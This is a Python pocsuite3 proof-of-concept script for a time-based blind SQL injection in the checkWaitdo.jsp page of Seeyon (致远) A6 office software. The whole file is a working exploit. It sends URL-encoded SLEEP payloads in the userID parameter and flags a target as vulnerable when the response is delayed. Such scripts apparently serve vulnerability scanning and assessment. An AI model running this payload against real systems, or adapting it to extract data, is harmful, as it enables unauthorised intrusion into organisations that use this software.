#!/usr/bin/env python
# -*- coding: utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''致远_A6_checkWaitdo_time-sqli'''
    desc = ''''''
    solution = ''''''
    severity = '''high'''
    vulType = '''sql-inj'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''协同办公系统'''
    appVersion = '''A6'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        result = {}
        self.url, ip, port = parse_ip_port(self.target, 80)
        check_url = make_verify_url(self.url, "/yyoa/checkWaitdo.jsp?userID=1%25%27 AND (SELECT * FROM (SELECT(SLEEP(0)))uRLv) AND %27%25%27%3D%27", mod=0)
        resp0 = requests.get(check_url, verify=False, timeout=15)
        if b'checkWaitdo' in resp0.content and resp0.status_code == 200:
            vul_url = make_verify_url(self.url, "/yyoa/checkWaitdo.jsp?userID=1%25%27 AND (SELECT * FROM (SELECT(SLEEP(5)))uRLv) AND %27%25%27%3D%27", mod=0)
            resp = requests.get(vul_url, verify=False, timeout=15)
            if resp.elapsed.total_seconds() - resp0.elapsed.total_seconds() >= 4.5 and resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['port'] = port
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
